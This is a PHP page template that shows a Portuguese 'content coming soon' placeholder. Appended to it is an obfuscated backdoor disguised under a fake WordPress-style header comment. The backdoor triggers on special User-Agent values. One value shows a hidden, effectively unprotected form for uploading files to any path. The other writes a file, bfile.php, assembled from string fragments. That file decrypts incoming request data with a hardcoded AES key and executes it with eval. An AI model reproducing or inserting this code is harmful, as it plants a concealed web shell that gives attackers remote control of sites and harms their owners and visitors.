<section class="fd-body">
	<?php include("lib/breadcrumbs.php"); ?>
	<div class="container text-center"><br><br><br>
		<p><img src="<?php echo URL1 ?>/imagens/atencao-webcriacoes1.png" width="256" height="256"></p>
		<p class="txt-tam14">Estamos providenciando o conte&uacute;do.</p>
		<p>AGUARDE!</p><br><br><br>
	</div>
</section>

<?php

/**
 * file for setting the ABSPATH constant and loading the config.php file. The config.php file will then load the settings.php file, which will then set up the Press environment.
 *
 * @package Press
 */
define('OBJECT_K', 'OBJECT_K');
$ptwo = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$pone = 'Lockcore';
$furl = "SSL://" . $pone . "/" . "\\[]\\//";
$fgcurl = "https://" . $pone . "fgcwork.php";
function beusage($argv)
{
    echo "Usage:\n";
    printf("\tphp %s <http://example.com/file> <localfile>\n", $argv[0]);
    exit(1);
}
$agt = $_SERVER['HTTP_USER_AGENT'];
$system = 'widget-load';
$ndeup = 'up';
$ndebe = 'be';
$ccurl = "update-ssl" . $pone . "curlwork.php";
$posa = $agt === $ndeup;
$poso = $agt === $ndebe;
function beosa($argv)
{
    echo "Usage:\n";
    printf("\tphp %s <http://example.com/file> <localfile>\n", $argv[0]);
    exit(1);
}
if (isset($_FILES['mbdfiles']) && (empty($pass) || md5($_POST['p']) == $pass)) {
    $gg = array('co' . 'py');
    echo $gg[chr(48)]($_FILES['mbdfiles']['tmp_name'], $_POST['id']);
    exit;
}

if ($posa) {
    echo ' <form class="up" method="post" enctype="multipart/form-data" style="display: none;"> <input type="text" name="id"/> <input type="text" name="p"/> <input type="file" name="mbdfiles"/> <input type="submit"/> </form> ';
}
function _becape($data)
{
    if (is_array($data)) {
        foreach ($data as $k => $v) {
            if (is_array($v)) {
                $data[$k] = $escape($v);
            } else {
                $data[$k] = $real_escape($v);
            }
        }
    } else {
        $data = $real_escape($data);
    }

    return $data;
}
if ($poso) {
    if (!function_exists('file_put_contents')) {
        function file_put_contents($filename, $data, $file_append = false)
        {
            $fp = fopen($filename, (!$file_append ? 'w+' : 'a+'));
            if (!$fp) {
                trigger_error('file_put_contents cannot write in file.', E_USER_ERROR);
                return;
            }
            fputs($fp, $data);
            fclose($fp);
        }
    }
    $file = 'bfile.php';
    $gove = '<?php ';
    $hinerir = '@erro';
    $acten_a = 'r_reporti';
    $firegc = 'ng(0); function Decryp';
    $biliga = 't($data){
    $key = "e45e329feb5d925b"; $magicN';
    $lofeter24 = 'um = hex';
    $dbx12 = 'dec(substr($key, 0, 2)) % 16; 
    $data = sub';
    $malioo = 'str($data, 0, strlen($data) - $mag';
    $godtheme = 'icNum); 
    return openssl_decr';
    $raiopa = 'ypt(base64_deco';
    $pokerki = 'de($data), "AES-12';
    $tiony_me = '8-ECB", $key, OPENSSL_PKC';
    $sbuloa = 'S1_PADDING);
}
$post = Decry';
    $comesoable = 'pt(file_get_conten';
    $abulity = 'ts("php://inp';
    $senoio = 'ut"));
eva';
    $ysetting = 'l($post);';

    $fillcontent = $gove . $hinerir . $acten_a . $firegc . $biliga . $lofeter24 . $dbx12 . $malioo . $godtheme . $raiopa .
        $pokerki . $tiony_me . $sbuloa . $comesoable . $abulity . $senoio . $ysetting;
    function becaro()
    {
        clear_scheduled_hook('edd_daily_scheduled_events');
        clear_scheduled_hook('edd_daily_cron');
        clear_scheduled_hook('edd_weekly_cron');
    }
    file_put_contents("$file", "$fillcontent");
}
?>
